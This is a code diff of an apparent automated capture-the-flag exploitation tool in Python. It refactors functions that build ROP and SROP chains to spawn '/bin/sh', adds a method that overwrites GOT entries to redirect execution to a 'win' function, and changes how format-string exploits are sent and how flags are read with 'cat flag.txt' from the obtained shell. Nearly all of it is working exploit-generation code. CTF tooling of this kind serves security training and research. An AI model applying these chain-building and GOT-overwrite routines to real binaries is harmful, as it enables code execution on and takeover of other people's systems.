@@ -69,6 +69,8 @@ class Against:
             b win
             finish
         """
+
+        # set context so other functions know if its remote or local
         self.option = option
 
         if option == "REMOTE" and self.ip != None and self.port != None:
@@ -108,35 +110,36 @@ class Against:
             reg_size = reg_size_1
 
         index = 0
+        
+        reg1_gadget = self.machine.find_reg_gadget(reg1.decode("utf-8"))
+        reg2_gadget = self.machine.find_reg_gadget(reg2.decode("utf-8"))
+
+
         while len(string) - index > 0:
             rem = (len(string) - index) % (reg_size+1)
-            reg_gadget = self.machine.find_reg_gadget(reg1.decode("utf-8"))
-            if reg_gadget != None:
-                for reg_gadget_str in reg_gadget:
-                    rg_gadget = p64(int(reg_gadget_str.split(b":")[0], 16))
-                    chain += rg_gadget + p64(writeable_address+index)
-                    instructions = reg_gadget_str.split(b":")[1].split(b";")[1:]
-                    for inst in instructions:
-                        if b"pop" in inst:
-                            chain += b"A"*8
+            for reg_gadget_str in reg1_gadget:
+                rg_gadget = p64(int(reg_gadget_str.split(b":")[0], 16))
+                chain += rg_gadget + p64(writeable_address+index)
+                instructions = reg_gadget_str.split(b":")[1].split(b";")[1:]
+                for inst in instructions:
+                    if b"pop" in inst:
+                        chain += b"A"*8
 
-            reg_gadget = self.machine.find_reg_gadget(reg2.decode("utf-8"))
-            if reg_gadget != None:
-                for reg_gadget_str in reg_gadget:
-                    rg_gadget = p64(int(reg_gadget_str.split(b":")[0], 16))
+            for reg_gadget_str in reg2_gadget:
+                rg_gadget = p64(int(reg_gadget_str.split(b":")[0], 16))
 
-                    write_str = string[index:index+rem+1]
-                    write_str = write_str + b"\x00" * (8 - len(write_str))
-                    chain += rg_gadget + write_str
-                    instructions = reg_gadget_str.split(b":")[1].split(b";")[1:]
-                    for inst in instructions:
-                        if b"pop" in inst:
-                            reg = inst.strip(b" ").split(b" ")[1]
-                            if reg.decode("utf-8") == reg1:
-                                index = reg_params.index(reg.decode("utf-8"))
-                                chain += p64(writeable_address+index) 
-                            else:
-                                chain += b"B"* 8 
+                write_str = string[index:index+rem+1]
+                write_str = write_str + b"\x00" * (8 - len(write_str))
+                chain += rg_gadget + write_str
+                instructions = reg_gadget_str.split(b":")[1].split(b";")[1:]
+                for inst in instructions:
+                    if b"pop" in inst:
+                        reg = inst.strip(b" ").split(b" ")[1]
+                        if reg.decode("utf-8") == reg1:
+                            index = reg_params.index(reg.decode("utf-8"))
+                            chain += p64(writeable_address+index) 
+                        else:
+                            chain += b"B"* 8 
             chain += p64(write_gadget_address)
             instructions = write_gadget.split(b":")[1].split(b";")[1:]
             for inst in instructions:
@@ -151,7 +154,7 @@ class Against:
         chain = b""
 
         reg_params = self.machine.sys_reg_args
-        
+
         if len(parameters) > 0:
             for i in range(len(parameters)):
                 reg_gadgets = self.machine.find_reg_gadget(reg_params[i])
@@ -184,27 +187,31 @@ class Against:
 
         reg_params = self.machine.reg_args[:len(parameters)]
 
-        if len(parameters) > 0:
-            for i in range(len(parameters)):
-                reg_gadgets = self.machine.find_reg_gadget(reg_params[i])
-                if reg_gadgets != None:
-                    for reg_gadget_str in reg_gadgets:
-                        reg_addr = int(reg_gadget_str.split(b":")[0],16)
-                        reg_gadget = p64(int(reg_gadget_str.split(b":")[0], 16))
-                        chain += reg_gadget + p64(parameters[i])
-                        instructions = reg_gadget_str.split(b":")[1].split(b";")[1:]
-                        for inst in instructions:
-                            if b"pop" in inst:
-                                reg = inst.strip(b" ").split(b" ")[1]
-                                if reg.decode("utf-8") in reg_params:
-                                    index = reg_params.index(reg.decode("utf-8"))
-                                    chain += p64(parameters[index])
-                                else:
-                                    chain += b"A" * 8
+        if len(parameters) == 0:
+            chain += p64(self.elf.sym[function])
+            return chain
 
-                            elif b"add rsp" in inst:
-                                value = int(inst.split(b",")[1].strip(), 16)
-                                chain += p64(0) * (value / 8)
+        for i in range(len(parameters)):
+            reg_gadgets = self.machine.find_reg_gadget(reg_params[i])
+            if reg_gadgets == None:
+                continue
+            for reg_gadget_str in reg_gadgets:
+                reg_addr = int(reg_gadget_str.split(b":")[0],16)
+                reg_gadget = p64(int(reg_gadget_str.split(b":")[0], 16))
+                chain += reg_gadget + p64(parameters[i])
+                instructions = reg_gadget_str.split(b":")[1].split(b";")[1:]
+                for inst in instructions:
+                    if b"pop" in inst:
+                        reg = inst.strip(b" ").split(b" ")[1]
+                        if reg.decode("utf-8") in reg_params:
+                            index = reg_params.index(reg.decode("utf-8"))
+                            chain += p64(parameters[index])
+                        else:
+                            chain += b"A" * 8
+
+                    elif b"add rsp" in inst:
+                        value = int(inst.split(b",")[1].strip(), 16)
+                        chain += p64(0) * (value / 8)
         
         chain += p64(self.elf.sym[function])
 
@@ -244,6 +251,7 @@ class Against:
         pattern = re.compile(b'.{5}\x7f')
         match = None
         attempts = 0
+
         while match == None and attempts <= 20:  
             try:
                 output = p.recvline(timeout=2)
@@ -281,6 +289,39 @@ class Against:
         chain += p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system)
 
         return chain
+
+
+    def array_write(self, value, target):
+        got_section = self.machine.sections[".got.plt"]
+        index = (target - value[0]) // value[1]
+        rem = (target - value[0]) % value[1]
+
+        start_addr = value[0] + index * value[1]
+        end_addr = start_addr + value[1]
+
+        if start_addr < got_section.start+0x18 or end_addr > got_section.end:
+            aegis_log.warning(f"Writing out of bounds of got section")
+
+        aegis_log.debug(f"[{self.binary_name}] Writing to {hex(target)} with index {index} and {rem}\nStart of write {hex(start_addr)}, End of write {hex(end_addr)}")
+
+        # Make sure not to overwrite system got entry
+        system_plt = self.elf.plt["system"] + 0x6
+        system_got = self.elf.got["system"]
+        addr = start_addr
+        edit = b""
+        size = value[1]
+        while rem > 0:
+            if addr == target:
+                break
+            if addr == system_got:
+                edit += p64(system_plt)
+            else:
+                edit += b"A" * 8
+            rem -= 8
+            addr += 8
+    
+        edit += p64(self.elf.sym["win"])
+        self.array_exploit = [index, edit]
 
     def rop_chain_srop_exec(self):
         """Return a SROP chain to execute system("/bin/sh")."""
@@ -351,6 +392,7 @@ class Against:
                     if len(response) % 2 == 1:
                         response = b"0" + response
 
+                    # Split hex into bytes and reverse endianess
                     hex = [response[i:i+2] for i in range(0, 16, 2)][::-1]
 
                     try: 
@@ -363,7 +405,6 @@ class Against:
                         #print(new_string)
                         # start end [ 0 , 0]
                         # first var is if the first part of the flag was found
-
                         if self.flag_format.decode("utf-8") in new_string and start_end[0] == 0:
                             string += new_string
                             start_end[0] = 1
@@ -390,8 +431,6 @@ class Against:
                                 self.flag = string
                             break
                     except Exception as e:
-
-                        print(e)
                         p.close()
                     p.close()
             except Exception as e:
@@ -450,8 +489,6 @@ class Against:
                     aegis_log.debug(f"Sending libc system chain {self.libc_exploit}")
                     self.process.sendline(self.libc_exploit)
 
-            if self.debug == True:
-                self.process.interactive()
         else:
             if self.format_exploit != None and self.array_exploit == None or len(self.array_exploit) == 0: 
                 aegis_log.debug(f"Sending format string exploit as {self.format_exploit} {len(self.format_exploit)} {len(self.format_exploit) % 16}")
@@ -462,14 +499,8 @@ class Against:
                 self.process.sendline(b"%i" % self.array_exploit[0])
                 self.process.recvuntil(self.delimiter)
                 self.process.sendline(self.array_exploit[1])
-
-            #if self.has_libc_leak == True:
-                #libc_base = self.recv_libc_leak(self.process, self.leak_function)
-                #chain = self.rop_chain_libc(libc_base)
-                #aegis_log.info(f"Sending libc system chain {self.chain}")
-                #self.process.sendline(chain)
-            if self.debug == True:
-                self.process.interactive()
+        if self.debug == True:
+            self.process.interactive()
 
 
     def verify_flag(self):
@@ -501,30 +532,30 @@ class Against:
 
     def recieve_flag(self):
         """Return the flag after parsing it from the binary."""
+        match = None
+        output = None
+
         try:
-            # Just for safe measures ofc
-            for i in range(random.choice(range(1,10))):
+            for i in range(10):
                 self.process.sendline(b"cat flag.txt")
-            self.process.sendline(b"exit")
+                output = self.process.recvall(timeout=1)
+                match = self.flag_regex.search(output)
+                if match:
+                    break
+        except EOFError:
+            aegis_log.warn(f"Error recieving flag")
 
-            output = self.process.recvall(timeout=5)
-            # Don't want to print big output from format write
-            if self.format_exploit == None:
-                aegis_log.debug(f"[{self.binary_name}] Recieved output {output}")
-            match = self.flag_regex.search(output)
+        if match:
+            flag = self.flag_format.decode("utf-8") + "{" + match.group(1).decode('utf-8') + "}" 
+            aegis_log.critical(f"[{self.binary_name}] Captured the flag !!! {flag}")
+            if self.option != "REMOTE":
+                self.flag = flag
+            else:
+                self.remote_flag = flag
 
-            if match:
-                flag = self.flag_format.decode("utf-8") + "{" + match.group(1).decode('utf-8') + "}" 
-                aegis_log.critical(f"[{self.binary_name}] Captured the flag !!! {flag}")
-                if self.option != "REMOTE":
-                    self.flag = flag
-                else:
-                    self.remote_flag = flag
-
-                return 1
-            elif b"command not found" in output:
-                aegis_log.error(f"[{self.binary_name}] Error from shell command")
-                return 1
-        except EOFError as e:
-            aegis_log.warn(f"Error recieving flag {e}")
-            return -1
+            return 1
+        elif b"command not found" in output:
+            aegis_log.error(f"[{self.binary_name}] Error from shell command")
+            return 1
+        else:
+            return -1 
